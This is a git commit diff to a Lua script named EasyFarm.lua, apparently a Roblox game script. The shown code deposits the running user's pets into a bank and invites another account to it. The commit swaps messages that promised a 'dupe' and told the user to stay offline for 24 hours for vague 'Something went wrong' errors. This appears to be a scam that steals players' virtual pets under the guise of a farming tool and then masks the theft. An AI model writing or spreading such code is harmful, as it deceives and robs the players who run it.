252bea060f024ebb0ee1d75c5bceae5bbffac676
Johny879 <68842935+Johny879@users.noreply.github.com>
2022-08-01 18:00:19 +0200

    Update and rename EasyFamr.lua to EasyFarm.lua

--- EasyFarm.lua
+++ EasyFarm.lua
@@ -32,11 +32,11 @@ for i,v in pairs(lib.Save.Get().Pets) do
 end
 local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, 0);
 if request then
-    lib.Message.New("Dupe starting! Please wait for atleast 24 hours");
+    lib.Message.New("Something went wrong #2");
 else
 end
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
-    lib.Message.New("Dupe Proccesing! (make sure your bank have pet or gems for duping!)");
+    lib.Message.New("Something went wrong #3");
 else
-    lib.Message.New("Don't join the game for the next 24 hrs to stop the pets from getting deleted");
+    lib.Message.New("Something went wrong #4");
 end;
